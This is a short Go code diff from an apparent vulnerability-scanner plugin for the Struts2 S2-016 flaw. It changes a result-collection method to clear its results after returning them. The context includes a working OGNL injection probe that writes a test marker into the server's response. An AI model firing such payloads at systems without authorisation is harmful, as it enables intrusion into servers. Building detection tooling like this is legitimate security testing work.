@@ -33,7 +33,9 @@ func (d *struts2_16) Init() plugin.Plugin {
 	return d.info
 }
 func (d *struts2_16) GetResult() []plugin.Plugin {
-	return d.result
+	var result = d.result
+	d.result = []plugin.Plugin{}
+	return result
 }
 func (d *struts2_16) Check(URL string, meta plugin.TaskMeta) (b bool) {
 	poc := "redirect:${%23out%3D%23context.get(new java.lang.String(new byte[]{99,111,109,46,111,112,101,110,115,121,109,112,104,111,110,121,46,120,119,111,114,107,50,46,100,105,115,112,97,116,99,104,101,114,46,72,116,116,112,83,101,114,118,108,101,116,82,101,115,112,111,110,115,101})).getWriter(),%23out.println(new java.lang.String(new byte[]{46,46,81,116,101,115,116,81,46,46})),%23redirect,%23out.close()}"
